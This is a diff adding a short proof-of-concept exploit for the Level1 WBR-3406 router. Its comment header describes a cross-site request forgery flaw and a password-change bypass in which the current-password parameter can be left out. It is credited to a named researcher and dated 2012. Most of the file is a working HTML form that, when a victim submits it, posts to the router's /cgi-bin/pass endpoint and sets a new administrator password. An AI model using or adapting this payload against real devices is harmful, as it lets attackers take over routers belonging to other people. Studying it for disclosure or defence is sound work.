@@ -1,0 +1,29 @@
+# -----------------------------------------------------------
+# WBR-3406 Wireless Broadband NAT Router Web-Console Password Change Bypass & CSRF Vulnerability
+# This PoC code should do two main things:
+# 1. Cross Site Request Forgery (For more information, just google it).
+# 2. This code change to new password without know the current password.
+# The vulnerability work in a way that if we remove the "PA=" parameter which is the current password
+# the application ignore that and change the password without even entering the old / current password.
+# Bug discovered by Pr0T3cT10n AKA Yakir Wizman, <yakir.wizman@gmail.com>
+# Date 17/08/2012
+# Vendor site - http://www.level1.com/
+# ISRAEL
+# -----------------------------------------------------------
+#       Author will be not responsible for any damage.
+# -----------------------------------------------------------
+# PoC EXPLOIT
+# -----------------------------------------------------------
+<html>
+	<body>
+		<form action="http://192.168.123.254/cgi-bin/pass" method="POST">
+			<input type="hidden" name="rc" value="@" />
+			<input type="hidden" name="Pa" value="1234567" />
+			<input type="hidden" name="P1" value="1234567" />
+			<input type="hidden" name="rd" value="atbox" />
+			<input type="submit" value="Submit form" />
+		</form>
+	</body>
+</html>
+
+# -----------------------------------------------------------
